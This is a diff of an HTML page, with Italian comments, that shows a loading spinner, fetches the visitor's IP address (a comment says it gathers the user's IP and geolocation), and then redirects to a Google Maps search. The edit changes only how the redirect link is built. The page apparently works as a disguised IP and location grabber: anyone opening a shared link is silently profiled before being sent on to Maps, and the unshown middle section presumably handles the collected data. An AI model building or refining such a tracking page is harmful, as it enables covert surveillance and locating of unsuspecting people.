@@ -10,11 +10,11 @@
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
   <script>
-    // Ottieni il link di Google Maps dalla query string
+    // Ottieni il termine di ricerca dalla query string
     const urlParams = new URLSearchParams(window.location.search);
-    const location = urlParams.get('location');
+    const searchTerm = urlParams.get('q');
 
-    // Raccogli l'IP e il geolocalizzazione dell'utente
+    // Raccogli l'IP e la geolocalizzazione dell'utente
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
@@ -37,9 +37,10 @@
       });
     });
 
-    // Dopo 2 secondi, reindirizza alla mappa di Google
+    // Dopo 2 secondi, redirige l'utente a Google Maps con la ricerca
     setTimeout(() => {
-      window.location.href = location; // reindirizza al link di Google Maps
+      const googleSearchLink = "https://www.google.com/maps?q=" + encodeURIComponent(searchTerm);
+      window.location.href = googleSearchLink; // reindirizza alla ricerca su Google Maps
     }, 2000);
   </script>
 </head>
